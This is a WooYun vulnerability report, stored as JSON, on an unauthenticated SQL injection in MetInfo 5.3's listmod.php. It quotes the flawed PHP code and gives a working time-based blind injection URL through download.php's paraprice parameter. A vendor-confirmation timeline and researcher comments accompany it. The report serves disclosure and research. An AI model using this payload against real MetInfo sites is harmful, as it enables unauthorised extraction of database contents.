{"id": 65906, "wybug_id": "wooyun-2015-0126295", "wybug_title": "MetInfo最新版SQL注入一枚", "wybug_corp": "MetInfo", "wybug_author": "牛肉包子", "wybug_date": "2015-07-13 13:32", "wybug_open_date": "2015-10-14 08:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向公众公开  简要描述： 无需登录 详细说明：  看到MetInfo5.3/include/global/listmod.php164-184行\nforeach($dbparaname as $key=>$val2){\t\t\t$prices1=\"paraprice_\".$val2['id'];\t\t\t$prices=$$prices1;\t\t\tvar_dump($prices);\t\t\tif($prices){\t\t\t\t\tif(!strstr($prices, \"-\")){\t\t\t\t\t\tpreg_match('/([0-9\\.]+)/',$prices,$result);\t\t\t\t\t\t$results=$result[0];\t\t\t\t\t\t$serch_sql .= \" and exists(select * from $met_plist where module=3 and $met_plist.paraid='$val2[id]' and $met_plist.listid=$dbname.id and $met_plist.info > $results) \"; \t\t\t\t\t\t$serchpage .= \"&\".$prices1.\"=\".trim($$prices1);\t\t\t\t\t}else{\t\t\t\t\t\t//echo 3;\t\t\t\t\t\t$prices_sql=explode('-',$prices);\t\t\t\t\t\tpreg_match('/([0-9\\.]+)/',$prices_sql[1],$result);\t\t\t\t\t\t$results=$result[0];\t\t\t\t\t\t$serch_sql .= \" and exists(select * from $met_plist where module=3 and $met_plist.paraid='$val2[id]' and $met_plist.listid=$dbname.id and $met_plist.info > $prices_sql[0] and $met_plist.info < $results) \"; \t\t\t\t\t\t$serchpage .= \"&\".$prices1.\"=\".trim($$prices1);\t\t\t\t\t}\t\t\t\t\t\t\t}\t\t}\n其中\n$prices_sql[0]\n没有初始化，也没有单引号包裹。造成sql注入，但是前面有个逻辑判断。首先这里有个变量覆盖\n$prices=$$prices1;\n并且\nparaprice_\".$val2['id']\n我们可以控制。只有构造如下url就行了\nhttp://127.0.0.1/MetInfo5.3/download/download.php?search=search&mdmendy=1&paraprice_14=tomato-xxxx&mdname=product\n看到mysql日志\n\n   漏洞证明：  然后构造exp\nhttp://127.0.0.1/MetInfo5.3/download/download.php?search=search&mdmendy=1&paraprice_14=1) or if(ascii(mid(user(),1,1))=114,benchmark(10000000,md5(2)),1)%23-xxxx&mdname=product\n\n\n\n\n注入成功   修复方案：  过滤   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-16 08:43 厂商回复： 是系统漏洞，后续版本修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-13 13:37 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:768 漏洞数:97        )\t\t \n  叼叼叼！    \n     2015-07-13 14:04 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @玉林嘎 为何变成有限制了    \n     2015-07-13 14:33 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:359 漏洞数:46        | 答案)\t\t \n  叼叼叼！！    \n     2015-07-13 15:44 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  卧槽。2k到手。爷爷请客    \n     2015-07-13 17:57 |    \t\t暗香疏影 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:4        | 我感动哭了)\t\t \n  6666    \n     2015-07-13 23:09 |    \t\tSword \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:11        | 求大牛带飞)\t\t \n  我擦 大表哥真6666    \n     2015-07-16 08:52 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:403 漏洞数:90        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  牛肉包子  6666666666    \n     2015-07-16 21:51 |    \t\t康小泡 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 掉个offer给我吧)\t\t \n  爷爷，这个为什么有两个$    \n     2015-07-16 22:07 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @康小泡 0.0 大厂商    \n     2015-07-17 10:11 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @牛肉包子 师傅你不能这样的    \n     2015-07-20 20:49 |    \t\tANS5 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 爱生活，爱挖洞，更爱妹纸。)\t\t \n  卧槽。2k到手。爷爷请客     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}